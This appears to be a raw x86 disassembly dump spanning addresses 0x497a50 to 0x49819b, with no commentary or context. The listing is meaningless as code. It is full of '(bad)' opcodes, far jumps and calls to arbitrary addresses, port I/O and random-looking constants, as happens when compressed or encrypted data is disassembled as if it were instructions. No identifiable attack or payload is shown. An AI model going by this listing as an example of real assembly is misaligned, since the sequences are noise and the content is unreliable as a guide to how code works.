  497a50:	dec    edx
  497a51:	sbb    al,0x48
  497a53:	(bad)  
  497a54:	dec    ecx
  497a55:	xor    dh,bl
  497a57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  497a58:	(bad)  
  497a59:	inc    ebp
  497a5a:	xor    DWORD PTR [eax+edx*2],0xffffffd0
  497a5e:	sub    BYTE PTR [edi],0x9f
  497a61:	xchg   ecx,eax
  497a62:	and    BYTE PTR [eax],al
  497a64:	je     0x497a9a
  497a66:	scas   eax,DWORD PTR es:[edi]
  497a67:	dec    edx
  497a68:	leave  
  497a69:	int    0xb2
  497a6b:	fbstp  TBYTE PTR [ecx]
  497a6d:	test   BYTE PTR [ebp-0x12903cfa],dh
  497a73:	inc    esi
  497a74:	add    DWORD PTR [ebx],ebp
  497a76:	(bad)  
  497a77:	fild   WORD PTR [edi+eiz*1+0x48]
  497a7b:	pop    edx
  497a7c:	jb     0x497af0
  497a7e:	inc    ecx
  497a7f:	xor    DWORD PTR [ecx],ecx
  497a81:	sub    eax,0xcfcfad0e
  497a86:	push   eax
  497a87:	mov    edx,DWORD PTR [edx]
  497a89:	cmp    ebx,DWORD PTR [edi]
  497a8b:	iret   
  497a8c:	push   esi
  497a8d:	dec    ecx
  497a8e:	mov    bh,0x22
  497a90:	addr16 call 0x6704:0x48ac48a7
  497a98:	pop    edx
  497a99:	fwait
  497a9a:	jl     0x497a57
  497a9c:	addr16 out dx,eax
  497a9e:	cmp    DWORD PTR [edi],esp
  497aa0:	ret    0xb1aa
  497aa3:	adc    dh,bh
  497aa5:	mov    bh,0x18
  497aa7:	pop    fs
  497aa9:	adc    ebp,edi
  497aab:	jg     0x497afe
  497aad:	or     ebx,DWORD PTR [eax-0x28bb5876]
  497ab3:	inc    edx
  497ab4:	xor    eax,0x70722b0
  497ab9:	inc    ebp
  497aba:	lods   eax,DWORD PTR ds:[esi]
  497abb:	or     DWORD PTR [edx],esi
  497abd:	lds    eax,FWORD PTR [bx+si]
  497ac0:	mov    cl,0xba
  497ac2:	mov    bh,0x7
  497ac4:	and    eax,0xe75a4c6a
  497ac9:	and    BYTE PTR [ecx+esi*1],dh
  497acc:	cmp    bh,dh
  497ace:	pop    ss
  497acf:	mov    cl,0xbb
  497ad1:	dec    eax
  497ad2:	sub    al,0xd7
  497ad4:	aaa    
  497ad5:	das    
  497ad6:	xor    al,0x8c
  497ad8:	adc    eax,0x3ab04760
  497add:	or     eax,0x8970fed
  497ae2:	push   0xffffffc5
  497ae4:	and    ch,BYTE PTR [edi+0x40]
  497ae7:	push   ebx
  497ae8:	and    DWORD PTR [eax-0x72ba7881],edi
  497aee:	aad    0xff
  497af0:	mov    bh,0x76
  497af2:	inc    edx
  497af3:	xchg   BYTE PTR [esi],ah
  497af5:	or     ch,BYTE PTR [edi]
  497af7:	xor    BYTE PTR [edx-0x5d],cl
  497afa:	or     BYTE PTR [edx+ecx*1-0x41],bl
  497afe:	push   es
  497aff:	call   0x1f389b95
  497b04:	dec    edi
  497b05:	and    esi,DWORD PTR [ecx+edx*1-0x2c]
  497b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497b0a:	(bad)  [esi+0x6f1728b8]
  497b10:	pop    ds
  497b11:	les    ebp,FWORD PTR [edx]
  497b13:	or     al,0x65
  497b15:	packuswb mm2,QWORD PTR [edx]
  497b18:	aas    
  497b19:	mov    ah,0x83
  497b1b:	out    dx,eax
  497b1c:	sub    eax,DWORD PTR [eax+edx*1-0x60]
  497b20:	or     DWORD PTR [esi],0x5a8b33cf
  497b26:	inc    eax
  497b27:	jmp    0xcd3:0x47252f3f
  497b2e:	sbb    esi,DWORD PTR [ebx]
  497b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497b31:	inc    ebx
  497b32:	(bad)  
  497b33:	call   0x4611f6a
  497b38:	pop    edx
  497b39:	mov    ds:0x7cb52750,eax
  497b3e:	sbb    DWORD PTR [eax-0x45],0x26
  497b42:	xor    eax,0x20224154
  497b47:	dec    edi
  497b48:	push   edi
  497b49:	dec    ecx
  497b4a:	outs   dx,BYTE PTR ds:[esi]
  497b4b:	mov    dl,0xa4
  497b4d:	aas    
  497b4e:	inc    ecx
  497b4f:	push   ss
  497b50:	and    eax,0x97170976
  497b55:	bound  edx,QWORD PTR [ebp-0x7c]
  497b58:	or     BYTE PTR [edi+0x47],al
  497b5b:	mov    cl,0x5
  497b5d:	test   DWORD PTR [edx-0x31],ebp
  497b60:	xchg   DWORD PTR [eax+0x47],ebp
  497b63:	sub    ah,ah
  497b65:	inc    esp
  497b66:	outs   dx,DWORD PTR ds:[esi]
  497b67:	inc    esi
  497b68:	test   DWORD PTR [eax-0x3900e894],ebx
  497b6e:	ins    BYTE PTR es:[edi],dx
  497b6f:	adc    BYTE PTR [ebx],al
  497b71:	das    
  497b72:	sub    edx,DWORD PTR [esi]
  497b74:	sbb    al,0x10
  497b76:	ja     0x497b57
  497b78:	lds    ebp,FWORD PTR ds:0x75b0f51
  497b7e:	push   ss
  497b7f:	add    edx,DWORD PTR [esi]
  497b81:	shl    DWORD PTR [ecx],1
  497b83:	fisttp WORD PTR [edi+0x43]
  497b86:	mov    edx,0xdfbf1e38
  497b8b:	inc    edx
  497b8c:	cs inc ebp
  497b8e:	lods   eax,DWORD PTR ds:[esi]
  497b8f:	or     dl,BYTE PTR [edi]
  497b91:	sub    ebx,DWORD PTR [ebp+0x1c]
  497b94:	sub    eax,DWORD PTR [edi+ebx*1]
  497b97:	xlat   BYTE PTR ds:[ebx]
  497b98:	xor    DWORD PTR [esi+0x5a],ebp
  497b9b:	add    ecx,DWORD PTR [ebp+0x582bc667]
  497ba1:	adc    DWORD PTR [ecx-0x30],ebx
  497ba4:	xchg   DWORD PTR [eax],edi
  497ba6:	sub    DWORD PTR [ebp-0x7f0818b7],ebp
  497bac:	aad    0x74
  497bae:	mov    al,0xc3
  497bb0:	pop    ds
  497bb1:	add    al,0x21
  497bb3:	lods   al,BYTE PTR ds:[esi]
  497bb4:	mov    ebx,0xc147386f
  497bb9:	shl    BYTE PTR [edi],0x81
  497bbc:	push   edi
  497bbd:	pop    esp
  497bbe:	sub    al,0x49
  497bc0:	stos   DWORD PTR es:[edi],eax
  497bc1:	xchg   DWORD PTR [edi],esi
  497bc3:	inc    edx
  497bc4:	adc    eax,0x1f842988
  497bc9:	inc    esp
  497bca:	mov    al,ds:0x1f633369
  497bcf:	push   ebp
  497bd0:	and    DWORD PTR [ecx-0x15],ecx
  497bd3:	ud0    ebp,DWORD PTR [ecx]
  497bd6:	arpl   WORD PTR [ebx],ax
  497bd8:	lea    edx,[edi+0x71]
  497bdb:	fcmovnbe st,st(2)
  497bdd:	sbb    dl,BYTE PTR [edi]
  497bdf:	pop    ds
  497be0:	xor    al,0xa
  497be2:	cwde   
  497be3:	pop    edx
  497be4:	xor    esp,DWORD PTR es:[eax-0x54]
  497be8:	and    DWORD PTR [eax+0x4236d417],eax
  497bee:	add    eax,0x35ac37f7
  497bf3:	xchg   ebx,eax
  497bf4:	pop    eax
  497bf5:	xchg   DWORD PTR [ebp+0x0],edx
  497bf8:	sbb    edi,DWORD PTR [edi-0x5740c8f9]
  497bfe:	mov    edx,0x33ff8558
  497c03:	pop    ss
  497c04:	push   es
  497c05:	mov    al,0xc0
  497c07:	test   DWORD PTR [esi],esi
  497c09:	into   
  497c0a:	and    BYTE PTR [eax-0x58402bee],dh
  497c10:	leave  
  497c11:	in     eax,0xdb
  497c13:	xor    DWORD PTR [edi+0x4a39357f],esi
  497c19:	or     cl,BYTE PTR [ebx+0x175f0789]
  497c1f:	or     BYTE PTR [ebx],0xc
  497c22:	jg     0x497c93
  497c24:	push   ss
  497c25:	or     al,0xa4
  497c27:	push   es
  497c28:	scas   eax,DWORD PTR es:[edi]
  497c29:	aam    0xc0
  497c2b:	mov    dh,0xba
  497c2d:	div    DWORD PTR [ebx]
  497c2f:	scas   eax,DWORD PTR es:[edi]
  497c30:	sub    esp,DWORD PTR [esi]
  497c32:	or     DWORD PTR [eax],ebx
  497c34:	out    dx,eax
  497c35:	mov    BYTE PTR [ebx-0x54],al
  497c38:	adc    BYTE PTR [edi],bh
  497c3a:	pop    edi
  497c3b:	adc    eax,ecx
  497c3d:	sub    BYTE PTR [eax],dh
  497c3f:	(bad)  
  497c40:	jg     0x497c7a
  497c42:	xchg   BYTE PTR [ebp+0x60],dl
  497c45:	sbb    DWORD PTR [edi+0x7f],ebp
  497c48:	adc    eax,0x77b7545b
  497c4d:	xor    edi,esi
  497c4f:	xor    eax,0x6b60044d
  497c54:	xor    esi,DWORD PTR [edi+0x58d0ab13]
  497c5a:	mov    edi,0xa830088
  497c5f:	scas   eax,DWORD PTR es:[edi]
  497c60:	xchg   DWORD PTR [esi+0x3368158a],esi
  497c66:	(bad)  
  497c67:	pop    edi
  497c68:	xlat   BYTE PTR ds:[ebx]
  497c69:	ror    DWORD PTR ds:0x91678949,1
  497c6f:	inc    esi
  497c70:	and    ecx,DWORD PTR [edi+ecx*4+0x10bc6833]
  497c77:	ror    DWORD PTR [edi],cl
  497c79:	xlat   BYTE PTR ds:[ebx]
  497c7a:	cdq    
  497c7b:	rol    BYTE PTR [ecx+eax*4],0x47
  497c7f:	inc    ecx
  497c80:	push   ecx
  497c81:	aam    0x49
  497c83:	push   eax
  497c84:	out    dx,eax
  497c85:	nop
  497c86:	add    BYTE PTR [edx+0x70],dl
  497c89:	xchg   DWORD PTR ds:0xea429a9,esi
  497c8f:	xor    al,0x38
  497c91:	out    dx,eax
  497c92:	push   ebx
  497c93:	or     al,BYTE PTR [ebx]
  497c95:	inc    edx
  497c96:	dec    edi
  497c97:	add    DWORD PTR [esi+0x46c67494],0x80608527
  497ca1:	mov    eax,ds:0xe1457f31
  497ca6:	stos   BYTE PTR es:[edi],al
  497ca7:	fs (bad) 
  497ca9:	xor    eax,0x98856c56
  497cae:	daa    
  497caf:	jg     0x497c56
  497cb1:	mov    eax,eax
  497cb3:	add    BYTE PTR [edi],dl
  497cb5:	xor    ebx,DWORD PTR [esi]
  497cb7:	dec    ecx
  497cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  497cb9:	sub    BYTE PTR [edi],ch
  497cbb:	out    dx,eax
  497cbc:	sbb    eax,0xb3f42e94
  497cc1:	inc    ebx
  497cc2:	mov    bh,0x12
  497cc4:	inc    ebp
  497cc5:	ss xor eax,0x1d4af745
  497ccb:	sbb    ebp,DWORD PTR [edx+0x34ef3137]
  497cd1:	push   edi
  497cd2:	and    WORD PTR ds:0x6de79fd4,dx
  497cd9:	lds    esp,FWORD PTR [eax]
  497cdb:	fisubr WORD PTR [ebx]
  497cdd:	fild   QWORD PTR [edi]
  497cdf:	rcr    BYTE PTR [edx],0x81
  497ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497ce3:	xchg   DWORD PTR [edi+0x1d034174],esp
  497ce9:	lahf   
  497cea:	xor    al,0x6f
  497cec:	loop   0x497cc2
  497cee:	sbb    ah,BYTE PTR [ebp+0x552877f7]
  497cf4:	add    eax,0x4cf738eb
  497cf9:	push   0x641708d1
  497cfe:	inc    dx
  497d00:	xlat   BYTE PTR ds:[ebx]
  497d01:	outs   dx,DWORD PTR ds:[esi]
  497d02:	xor    DWORD PTR [edi+0x39],esp
  497d05:	rcr    BYTE PTR [edx-0x68405af3],cl
  497d0b:	jo     0x497d7d
  497d0d:	dec    edx
  497d0e:	jg     0x497d55
  497d10:	jg     0x497d6d
  497d12:	pop    es
  497d13:	test   BYTE PTR [eax],dl
  497d15:	fbstp  TBYTE PTR [edi]
  497d17:	ds mov ch,0x91
  497d1a:	xchg   esi,eax
  497d1b:	mov    bh,0xd7
  497d1d:	mov    cl,0x3a
  497d1f:	popa   
  497d20:	sub    eax,0x957057ee
  497d25:	push   es
  497d26:	(bad)  
  497d27:	pop    ds
  497d28:	addr16 ss dec ebp
  497d2b:	or     ch,dl
  497d2d:	xchg   edx,eax
  497d2e:	aas    
  497d2f:	pop    es
  497d30:	cmp    cl,BYTE PTR [esi+0x4a]
  497d33:	pop    edx
  497d34:	ja     0x497d67
  497d36:	add    ebx,DWORD PTR [eax+0x60]
  497d39:	inc    ebp
  497d3a:	pop    edi
  497d3b:	or     BYTE PTR [ecx+0x7f66b051],0x67
  497d42:	push   es
  497d43:	xor    ch,ah
  497d45:	mov    dh,0xc7
  497d47:	mov    ds:0xaae4901,eax
  497d4c:	xlat   BYTE PTR ds:[ebx]
  497d4d:	xor    DWORD PTR [ebx+0x6735b580],ebp
  497d53:	out    0x7,eax
  497d55:	pop    eax
  497d56:	mov    bl,0x8c
  497d58:	inc    ebp
  497d59:	ret    
  497d5a:	mov    edi,0x188b01e2
  497d5f:	(bad)  
  497d61:	dec    esp
  497d62:	shr    BYTE PTR [edx],1
  497d64:	ins    BYTE PTR es:[edi],dx
  497d65:	ja     0x497d76
  497d67:	add    DWORD PTR [eax+0x48],esi
  497d6a:	ins    BYTE PTR es:[edi],dx
  497d6b:	pop    edi
  497d6c:	or     edx,DWORD PTR [eax+0x2b]
  497d6f:	mov    ah,0x6e
  497d71:	aas    
  497d72:	lahf   
  497d73:	and    al,0x1f
  497d75:	test   DWORD PTR ds:0x3646ef27,edx
  497d7b:	push   es
  497d7c:	xor    esp,DWORD PTR [edi+ebp*1-0x44edc3d4]
  497d83:	mov    ds:0x2dd8fea7,eax
  497d88:	test   BYTE PTR [eax+0xc135baf],bh
  497d8e:	lods   al,BYTE PTR ds:[esi]
  497d8f:	or     ebx,DWORD PTR [edi-0x5dfee4e9]
  497d95:	add    eax,0x24a5b127
  497d9a:	aaa    
  497d9b:	mov    edi,0x7685f35
  497da0:	xchg   edx,eax
  497da1:	pop    esp
  497da2:	cmp    BYTE PTR [ebx],al
  497da4:	dec    esp
  497da5:	pop    ss
  497da6:	or     edx,DWORD PTR [ebp+0x277367df]
  497dac:	pop    ebp
  497dad:	and    al,0x78
  497daf:	pop    es
  497db0:	inc    ebx
  497db1:	add    esi,DWORD PTR [edi+0x7b]
  497db4:	add    dl,BYTE PTR [ecx]
  497db6:	stos   BYTE PTR es:[edi],al
  497db7:	sub    al,0x77
  497db9:	sub    al,0x6e
  497dbb:	sbb    esp,DWORD PTR [ebx]
  497dbd:	ja     0x497dee
  497dbf:	jne    0x497d89
  497dc1:	fimul  DWORD PTR [ebp-0x69]
  497dc4:	xchg   edi,eax
  497dc5:	pop    ebx
  497dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497dc8:	mov    ch,0x3f
  497dca:	xchg   edi,eax
  497dcb:	aas    
  497dcc:	and    BYTE PTR [esi+0x25],ch
  497dcf:	inc    esi
  497dd0:	add    edi,DWORD PTR [esi]
  497dd2:	mov    eax,ds:0x870aab02
  497dd7:	push   edi
  497dd8:	and    ch,BYTE PTR [edx+eiz*2-0x37f098f0]
  497ddf:	add    BYTE PTR [esi-0x53],dh
  497de2:	xor    ebp,DWORD PTR [edx-0x80]
  497de5:	adc    DWORD PTR [edx+0x5458a737],ecx
  497deb:	push   edx
  497dec:	rcr    bh,0x9
  497def:	fdiv   DWORD PTR [ecx+0x55efb798]
  497df5:	xor    DWORD PTR [edx],esi
  497df7:	adc    eax,0x97374507
  497dfc:	bound  esi,QWORD PTR ds:0x777e8342
  497e02:	adc    BYTE PTR [eax],0x56
  497e05:	or     DWORD PTR [edi-0x779dd57c],ecx
  497e0b:	outs   dx,DWORD PTR ds:[esi]
  497e0c:	xor    DWORD PTR [edi-0x2d],esi
  497e0f:	dec    edx
  497e10:	cs sub dh,cl
  497e13:	inc    esp
  497e14:	push   edi
  497e15:	imul   esi,DWORD PTR [eax],0x575e160d
  497e1b:	pand   mm6,QWORD PTR [edi+0x2f4b3fb5]
  497e22:	push   edi
  497e23:	rcl    al,cl
  497e25:	and    cl,BYTE PTR [ecx]
  497e27:	jecxz  0x497df3
  497e29:	fcomp  DWORD PTR [esi-0x5f]
  497e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497e2d:	adc    al,BYTE PTR [edi+0x35a8563d]
  497e33:	(bad)  
  497e34:	pop    ds
  497e35:	xchg   edx,eax
  497e36:	inc    eax
  497e37:	or     al,0x61
  497e39:	push   esp
  497e3a:	pop    ds
  497e3b:	xchg   edi,eax
  497e3c:	test   BYTE PTR [ecx+0x0],dl
  497e3f:	push   0x69835637
  497e44:	mov    WORD PTR [esi-0x41],cs
  497e47:	test   BYTE PTR [esi+0x10],ah
  497e4a:	or     eax,DWORD PTR [edi]
  497e4c:	pop    es
  497e4d:	push   0xffffffba
  497e4f:	lods   eax,DWORD PTR ds:[esi]
  497e50:	jne    0x497e31
  497e52:	div    DWORD PTR [edi]
  497e54:	aaa    
  497e55:	sub    DWORD PTR [ebp-0x5d],esi
  497e58:	pop    es
  497e59:	aas    
  497e5a:	inc    esi
  497e5b:	scas   eax,DWORD PTR es:[edi]
  497e5c:	add    eax,0x7f108887
  497e61:	pop    edx
  497e62:	stos   DWORD PTR es:[edi],eax
  497e63:	ret    0x37c2
  497e66:	xchg   edi,eax
  497e67:	adc    edx,DWORD PTR [edx+0x48]
  497e6a:	dec    edi
  497e6b:	addr16 xor eax,0x15280037
  497e71:	call   0x133e65b8
  497e76:	or     eax,0x372bff28
  497e7b:	sbb    cl,BYTE PTR [eax+0x14]
  497e7e:	es push edi
  497e80:	sbb    BYTE PTR [ecx-0x73],ch
  497e83:	push   es
  497e84:	xchg   edi,esi
  497e86:	imul   esp,DWORD PTR [ebp+0xfe7b6b5],0xb
  497e8d:	pop    eax
  497e8e:	in     eax,dx
  497e8f:	loope  0x497e74
  497e91:	pop    ss
  497e92:	mov    bh,0x31
  497e94:	sbb    dl,BYTE PTR [esi+0x5742064f]
  497e9a:	shl    BYTE PTR [esi+0x361f18ea],1
  497ea0:	pop    edi
  497ea1:	jg     0x497f01
  497ea3:	sub    ebx,DWORD PTR [eax+0x55]
  497ea6:	pop    edi
  497ea7:	pop    es
  497ea8:	(bad)  
  497ea9:	and    eax,0x7f10a090
  497eae:	xchg   ebx,eax
  497eaf:	imul   ecx,DWORD PTR [ebx-0x59a838d2],0x1f
  497eb6:	out    0x0,eax
  497eb8:	push   es
  497eb9:	cdq    
  497eba:	adc    edi,esi
  497ebc:	aaa    
  497ebd:	cmp    DWORD PTR [ecx+ecx*1+0x18],ecx
  497ec1:	jmp    0x497f32
  497ec3:	out    dx,eax
  497ec4:	xor    BYTE PTR [eax+0x3790d293],cl
  497eca:	pop    ds
  497ecb:	push   edi
  497ecc:	adc    al,0x83
  497ece:	inc    esp
  497ecf:	pop    ds
  497ed0:	inc    ecx
  497ed1:	mov    cl,0x89
  497ed3:	xor    al,0x43
  497ed5:	iret   
  497ed6:	mov    bh,0x1b
  497ed8:	push   esi
  497ed9:	inc    ecx
  497eda:	push   0xeb54172f
  497edf:	aam    0xa
  497ee1:	push   cs
  497ee2:	pop    ss
  497ee3:	outs   dx,DWORD PTR ds:[esi]
  497ee4:	jmp    0xc9df:0x425cb502
  497eeb:	xor    DWORD PTR [eax-0x3a],ebx
  497eee:	ja     0x497f25
  497ef0:	push   ebp
  497ef1:	fsubr  DWORD PTR [eax+0x63]
  497ef4:	pop    ds
  497ef5:	aas    
  497ef6:	mov    ds:0x1f86c058,eax
  497efb:	pop    edi
  497efc:	inc    esp
  497efd:	mov    BYTE PTR [edx-0x2830c8b3],0x62
  497f04:	adc    DWORD PTR [ebx+0x1a],edx
  497f07:	xchg   edi,eax
  497f08:	push   esi
  497f09:	mov    eax,ds:0xa77b1d40
  497f0e:	rcl    al,cl
  497f10:	and    BYTE PTR [edi+ebp*4-0x4a653b23],ah
  497f17:	add    esp,DWORD PTR [edi-0x79]
  497f1a:	mov    ds:0xa65b8d22,al
  497f1f:	imul   DWORD PTR [eax+0x2f5300c0]
  497f25:	aaa    
  497f26:	iret   
  497f27:	adc    BYTE PTR [edx+eiz*2-0x4880c8af],ch
  497f2e:	mov    ebx,DWORD PTR [eax+0x11]
  497f31:	test   al,0xf
  497f33:	rol    BYTE PTR [esi+0x4c],0xae
  497f37:	xchg   edi,eax
  497f38:	aaa    
  497f39:	push   edi
  497f3a:	sub    esi,DWORD PTR gs:0x1a514f09
  497f41:	fcom   QWORD PTR ss:[ebx]
  497f44:	inc    ebp
  497f45:	push   edi
  497f46:	imul   ebp,edx
  497f49:	push   0x271e6858
  497f4e:	inc    esp
  497f4f:	stos   DWORD PTR es:[edi],eax
  497f50:	pusha  
  497f51:	push   ebp
  497f52:	lods   al,BYTE PTR ds:[esi]
  497f53:	daa    
  497f54:	xlat   BYTE PTR ds:[bx]
  497f56:	shl    dl,0x5a
  497f59:	or     eax,0x24a0ef7f
  497f5e:	push   ss
  497f5f:	shr    bl,0x87
  497f62:	xor    ecx,esp
  497f64:	xchg   edx,eax
  497f65:	shr    bh,1
  497f67:	addr16 push es
  497f69:	dec    esp
  497f6a:	add    esi,DWORD PTR [ecx+edi*1-0x69]
  497f6e:	inc    ebx
  497f6f:	ja     0x497fa5
  497f71:	fcmovnb st,st(0)
  497f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497f74:	outs   dx,BYTE PTR ds:[esi]
  497f75:	xchg   edi,eax
  497f76:	push   cs
  497f77:	or     DWORD PTR [edx-0x50],ecx
  497f7a:	aas    
  497f7b:	fist   WORD PTR [eax]
  497f7d:	inc    edx
  497f7e:	or     DWORD PTR [esi],esi
  497f80:	aas    
  497f81:	outs   dx,DWORD PTR ds:[esi]
  497f82:	inc    ebx
  497f83:	xor    eax,0x328f6e8c
  497f88:	pop    edi
  497f89:	xor    eax,eax
  497f8b:	ret    0x2c4e
  497f8e:	lahf   
  497f8f:	call   0xac3f:0x1f356069
  497f96:	or     BYTE PTR [esp+eax*4+0xf],ah
  497f9a:	inc    edx
  497f9b:	jb     0x497fd0
  497f9d:	or     al,0xdf
  497f9f:	xor    DWORD PTR ds:0x47b3046e,edx
  497fa5:	or     ch,bh
  497fa7:	sub    DWORD PTR [edx+0x1d],esp
  497faa:	inc    edx
  497fab:	rol    BYTE PTR [edi+0xb660318],cl
  497fb1:	out    dx,eax
  497fb2:	xchg   esp,eax
  497fb3:	shr    DWORD PTR [edx+0x389b2f66],cl
  497fb9:	jo     0x497fd0
  497fbb:	dec    eax
  497fbc:	iret   
  497fbd:	xor    eax,DWORD PTR [edi]
  497fbf:	add    ch,BYTE PTR [ebx+0x730f256c]
  497fc5:	or     ch,BYTE PTR [ebp+0x15]
  497fc8:	jg     0x497f51
  497fca:	jecxz  0x497f53
  497fcc:	and    DWORD PTR [ebp+0x60],eax
  497fcf:	push   0x6924385f
  497fd4:	xchg   esp,eax
  497fd5:	inc    ebx
  497fd6:	jle    0x497fb7
  497fd8:	inc    edx
  497fd9:	push   edx
  497fda:	and    al,0xac
  497fdc:	push   ss
  497fdd:	cmp    DWORD PTR [edx-0x6c],esp
  497fe0:	sbb    BYTE PTR [ecx],ah
  497fe2:	xchg   DWORD PTR [edi+0x245634a2],eax
  497fe8:	ud0    ebx,DWORD PTR [ecx]
  497feb:	mov    ds:0x41ffd019,eax
  497ff0:	lods   al,BYTE PTR ds:[esi]
  497ff1:	ror    DWORD PTR [eax],0xf
  497ff4:	orps   xmm1,XMMWORD PTR [ebx+0x6f]
  497ff8:	mov    ebx,0x27a7af1a
  497ffd:	push   ecx
  497ffe:	or     ebp,DWORD PTR [ebx+0x5827a794]
  498004:	int3   
  498005:	pop    edx
  498006:	xor    eax,0xa5df5f31
  49800b:	xor    al,0x26
  49800d:	shl    DWORD PTR [edi-0x62bbfed1],0x46
  498014:	and    cl,BYTE PTR [edi+0x5608b532]
  49801a:	not    DWORD PTR [eax+0x6f950690]
  498020:	popa   
  498021:	xor    BYTE PTR [ebx-0x75],al
  498024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498025:	lahf   
  498026:	xor    al,0xb0
  498028:	mov    al,0xcb
  49802a:	fwait
  49802b:	jmp    FWORD PTR [edi+0x38]
  49802e:	or     eax,0x2b95a129
  498033:	(bad)
  498037:	mov    ch,0x87
  498039:	jmp    0x3fb7:0x11084151
  498040:	mov    ch,0x6d
  498043:	pusha  
  498044:	xchg   edi,eax
  498045:	xor    al,0x62
  498047:	mov    cl,0x75
  498049:	xchg   ebx,eax
  49804a:	mov    bh,0xb7
  49804c:	mov    dl,0x10
  49804e:	rol    DWORD PTR [edx],0x1b
  498051:	ja     0x498026
  498053:	ret    0x7902
  498056:	lock out dx,eax
  498058:	ja     0x498092
  49805a:	adc    BYTE PTR [ecx+0x7537c015],ch
  498060:	ss mov ah,0x68
  498063:	idiv   esi
  498065:	imul   esi,DWORD PTR [ecx+0x3227b6e2],0x3c
  49806c:	and    dl,al
  49806e:	add    DWORD PTR [edi-0x1d],ecx
  498071:	nop
  498072:	mov    edx,0x872f1682
  498077:	(bad)  
  498078:	inc    eax
  498079:	test   BYTE PTR [edx],ch
  49807b:	aas    
  49807c:	pop    ds
  49807d:	(bad)  
  49807f:	sub    al,BYTE PTR [esi+0x60418a47]
  498085:	jne    0x4980d6
  498087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  498089:	xor    al,0x8a
  49808b:	mov    eax,0x2c28e738
  498090:	and    BYTE PTR [esi],dl
  498092:	mov    bh,0x42
  498094:	mov    eax,DWORD PTR ds:0xa02ef93
  49809a:	xchg   ebp,eax
  49809b:	mov    dh,0xb1
  49809d:	xchg   edi,eax
  49809e:	jg     0x4980e2
  4980a0:	rol    BYTE PTR [ebp-0x18c808b1],0x84
  4980a7:	sub    al,BYTE PTR [edx]
  4980a9:	or     eax,DWORD PTR [edi]
  4980ab:	aas    
  4980ac:	dec    ebx
  4980ad:	add    eax,ecx
  4980af:	imul   sp,WORD PTR [edi],0x39
  4980b3:	xchg   ebp,eax
  4980b4:	mov    dh,0x55
  4980b6:	add    bh,bl
  4980b8:	outs   dx,DWORD PTR ds:[esi]
  4980b9:	(bad)  
  4980ba:	mov    ch,0x4d
  4980bc:	stos   DWORD PTR es:[edi],eax
  4980bd:	pusha  
  4980be:	xchg   edi,eax
  4980bf:	jnp    0x498130
  4980c1:	sbb    DWORD PTR [edx+0x21],0xe4c4efa0
  4980c8:	arpl   WORD PTR ds:0x1037d6ef,si
  4980ce:	inc    esi
  4980cf:	add    bh,BYTE PTR [ecx]
  4980d1:	xchg   BYTE PTR [eax],bh
  4980d3:	and    DWORD PTR [ecx-0x7b],ebp
  4980d6:	ss pop es
  4980d8:	packssdw mm4,QWORD PTR [eax*4+0xd472f45]
  4980e0:	and    al,0xe4
  4980e2:	dec    eax
  4980e3:	push   cs
  4980e4:	inc    esi
  4980e5:	sbb    ah,BYTE PTR [ebx+0x575f9ac0]
  4980eb:	shr    BYTE PTR ds:0xf78be066,cl
  4980f1:	das    
  4980f2:	inc    esi
  4980f3:	adc    BYTE PTR [ebx-0x30a89e20],cl
  4980f9:	ret    
  4980fa:	add    ch,cl
  4980fc:	ss jnp 0x49813e
  4980ff:	xor    al,0x1b
  498101:	or     eax,0xaf9e00ed
  498106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498107:	les    edi,FWORD PTR [edx+0x3fe72312]
  49810d:	jecxz  0x498171
  49810f:	mov    al,bl
  498111:	das    
  498112:	cmp    DWORD PTR [edi+0x48aa2d19],esi
  498118:	out    0xcf,eax
  49811a:	pop    edx
  49811b:	enter  0xe011,0xd7
  49811f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498120:	xor    esp,DWORD PTR [eax+0x74]
  498123:	sbb    BYTE PTR [edi+0x5f],bl
  498126:	inc    DWORD PTR [ebx+0x20]
  498129:	mov    BYTE PTR [eax-0x6ff8a0f9],dh
  49812f:	inc    esi
  498130:	sbb    BYTE PTR [edx-0x2],bl
  498133:	xor    edx,DWORD PTR [esi+0x24]
  498136:	ret    0x3f85
  498139:	lahf   
  49813a:	add    ah,ah
  49813c:	add    DWORD PTR [esi],0x3ba431ee
  498142:	pop    eax
  498143:	inc    ecx
  498144:	scas   eax,DWORD PTR es:[edi]
  498145:	and    eax,edi
  498147:	cmp    cl,dl
  498149:	stos   BYTE PTR es:[edi],al
  49814a:	adc    al,0xb1
  49814c:	pop    edi
  49814d:	and    esp,DWORD PTR [esi]
  49814f:	add    ch,BYTE PTR [ebx]
  498151:	ret    0x3ff7
  498154:	adc    dl,BYTE PTR [esi+0x4]
  498157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498158:	(bad)  
  498159:	adc    eax,0xa7cd5c61
  49815e:	inc    esp
  49815f:	mov    edi,0x488946b6
  498164:	pop    ds
  498165:	dec    edi
  498166:	ror    BYTE PTR [edx],1
  498168:	sub    eax,0x484e4fac
  49816d:	stos   DWORD PTR es:[edi],eax
  49816e:	shl    bh,cl
  498170:	scas   eax,DWORD PTR es:[edi]
  498171:	xchg   BYTE PTR [esi+0x35ef8526],ch
  498177:	arpl   WORD PTR [ebp-0x76],dx
  49817a:	adc    BYTE PTR [edi-0xd],cl
  49817d:	test   al,0x10
  49817f:	stos   BYTE PTR es:[edi],al
  498180:	popa   
  498181:	das    
  498182:	xlat   BYTE PTR ds:[ebx]
  498183:	das    
  498184:	aad    0x22
  498186:	xor    bh,BYTE PTR cs:[edi]
  498189:	imul   esi,DWORD PTR [edi+0x5f045d0d],0x39
  498190:	addr16 test eax,0xdf1222a3
  498196:	inc    esi
  498197:	dec    edx
  498198:	and    DWORD PTR [ecx-0x76],eax
  49819b:	addr16 xcrypt-ofb (bad)
